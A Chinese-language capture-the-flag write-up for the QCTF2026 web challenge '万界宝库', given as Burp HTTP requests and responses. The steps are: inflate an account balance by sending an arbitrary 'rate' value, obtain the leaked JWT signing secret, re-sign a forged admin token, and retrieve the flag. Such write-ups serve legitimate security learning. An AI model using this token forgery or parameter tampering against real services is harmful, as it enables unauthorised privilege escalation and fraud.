---
title: 万界宝库（QCTF2026 web）
date: 2026-10-21
category: Web
tags:
  - CTF
  - Writeup
  - web
draft: false
summary: "一个\"宝库\"站，登录后手里的身份是 JWT。普通用户的 role 是 user/member，要提权到 admin 才能看到宝库层。"
collection: QCTF2026
---
# 万界宝库

## 第一节：题目
一个"宝库"站，登录后手里的身份是 JWT。普通用户的 role 是 user/member，要提权到 admin 才能看到宝库层。
## 第二节：过程
以下内容在BP上发送

**① 登录拿 JWT**（token 直接在响应头里发）：

```http
POST /api/login HTTP/1.1
Host: 5000-01781566-dee4-487a-9106-17bf1b8e302d.challenge.ctfplus.cn
Content-Type: application/json
Content-Length: 39
Connection: close

{"username":"guest","password":"guest"}
```

```http
HTTP/1.1 200 OK
Content-Length: 58
Content-Type: application/json
Date: Fri, 09 Oct 2026 05:34:35 GMT
Server: gunicorn
Set-Cookie: vault_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJndWVzdCIsIm5hbWUiOiJndWVzdCIsIm1lbWJlciI6ZmFsc2UsInJvbGUiOiJ2aXNpdG9yIiwiaWF0IjoxNzkxNTI0MDc1LCJleHAiOjE3OTE1MzEyNzV9.bTao7IhG3toduZO-wuW_bfrRtne9mZfIsSg01eLORdc; Expires=Fri, 09 Oct 2026 07:34:35 GMT; Max-Age=7200; Path=/; SameSite=Lax
Connection: close

{"message":"登录成功","username":"guest"}
```

**② 超级大赚钱** 改金额：

```http
POST /api/treasury/tick HTTP/1.1
Host: 5000-01781566-dee4-487a-9106-17bf1b8e302d.challenge.ctfplus.cn
Cookie: vault_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJndWVzdCIsIm5hbWUiOiJndWVzdCIsIm1lbWJlciI6ZmFsc2UsInJvbGUiOiJ2aXNpdG9yIiwiaWF0IjoxNzkxNTI0MDc1LCJleHAiOjE3OTE1MzEyNzV9.bTao7IhG3toduZO-wuW_bfrRtne9mZfIsSg01eLORdc
Content-Type: application/json
Content-Length: 20
Connection: close

{"rate": 1000000000}
```
你要觉得不够多点几次就行了

```http
HTTP/1.1 200 OK
Content-Length: 45
Content-Type: application/json
Server: gunicorn
Connection: close

{"balance":2000000000,"credited":1000000000}
```

**③ 买密钥**：
直接点网页的按钮即可，这里为了美观也加上了发送的包
```http
POST /api/items/break-delusion/purchase HTTP/1.1
Host: 5000-01781566-dee4-487a-9106-17bf1b8e302d.challenge.ctfplus.cn
Cookie: vault_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJndWVzdCIsIm5hbWUiOiJndWVzdCIsIm1lbWJlciI6ZmFsc2UsInJvbGUiOiJ2aXNpdG9yIiwiaWF0IjoxNzkxNTI0MDc1LCJleHAiOjE3OTE1MzEyNzV9.bTao7IhG3toduZO-wuW_bfrRtne9mZfIsSg01eLORdc
Content-Type: application/json
Content-Length: 2
Connection: close

{}
```

```http
HTTP/1.1 200 OK
Content-Length: 196
Content-Type: application/json
Server: gunicorn
Connection: close

{"content":"dGhlIHNlY3JldCBpcyB3YW5qaWUxMjM0NTY=","item":"地阶功法-破妄","message":"功法购买成功，卷轴已展开","price":1000}
```

 `dGhlIHNlY3JldCBpcyB3YW5qaWUxMjM0NTY=` base64解出来就是 `the secret is wanjie123456`。

**④ 换成伪造 token，买下"万界秘藏"**——把 member 翻 true、role 改 admin 后重签的版本：

```http
POST /api/items/myriad-secret/purchase HTTP/1.1
Host: 5000-01781566-dee4-487a-9106-17bf1b8e302d.challenge.ctfplus.cn
Cookie: vault_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJndWVzdCIsIm5hbWUiOiJndWVzdCIsIm1lbWJlciI6dHJ1ZSwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzkxNTI0MDc1LCJleHAiOjE3OTE1MzEyNzV9.HtAZcV4GgJEaS3mNUvyGWYvYR2HkuDR0Ff_0QnM35jE
Content-Type: application/json
Content-Length: 2
Connection: close

{}
```

```http
HTTP/1.1 200 OK
Content-Length: 185
Content-Type: application/json
Server: gunicorn
Connection: close

{"flag":"flag{39a53d6e-11fd-43a8-a0c7-5f12ef2d1ce5}","item":"万界秘藏","message":"购买成功，万界秘藏已送入识海"}
```

上面这条是复现抓到的，提交时的是 `flag{fd8b6977-201c-46cf-b6e1-4f3f8fbc8351}`。